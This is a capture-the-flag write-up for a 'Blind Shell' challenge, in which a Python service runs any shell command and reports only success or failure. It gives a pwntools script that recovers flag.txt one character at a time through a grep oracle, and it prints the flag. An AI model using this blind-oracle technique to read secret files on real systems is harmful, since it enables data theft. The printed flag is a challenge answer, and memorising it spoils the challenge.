# Blind Shell

> Points: 125

> Category: Misc/Pwn

## Description

Normally once you have a shell, you win. Here, you already start with a shell - can you find your way to the flag?

## Attachments

[Download Python File](https://imaginary.ml/r/CABD-blind.py)

`nc oreos.ctfchallenge.ga 12345`

```py
#!/usr/bin/env python3.8

from subprocess import run

if __name__ == "__main__":
    while True:
        cmd = input(">>> ")
        proc = run([cmd], capture_output=True, shell=True, timeout=60)
        if proc.returncode == 0:
            print("SUCCESS")
        else:
            print("FAILURE")
```

## Solution

We can see that the program tries to run whatever command we put in, and tells us whether it successfully executed or not.

Let's first check if there's a `flag.txt` file in our current directory.

```sh
>>> cat flag.txt
SUCCESS
```

Cool, there is. Now we need to somehow get the flag. 

We can start by initializing a string (let's call it `ans`) to **ictf{** (the start of the flag) and use the `grep` command to continually guess and check the next character. We will know whether or not our guess is correct depending on if it prints out `SUCCESS` or `FAILURE`. If it is successful, append the character to the `ans` string and repeat this until we get the entire flag.

Below is a python script that automates the process described above

```py
from pwn import *
import string

r = remote("oreos.ctfchallenge.ga", 12345)
chars = string.printable
ans = "ictf{"
r.recvuntil(">>> ")

while ans[-1] != "}":
    for i in chars:
        r.sendline('grep -F "{}" "flag.txt"'.format((ans+i)))
        # the -F option in grep searches for the string without interpreting it as regex
        response = r.recvuntil(">>> ").decode()
        if "SUCCESS" in response:
            # then we know that character is in the flag
            # and we don't need to check the rest (break)
            ans += i
            break
    print(ans)
```

### Flag

> ictf{g01n8*1n_bl!nd?n0t*@\_pr0bl3m!}
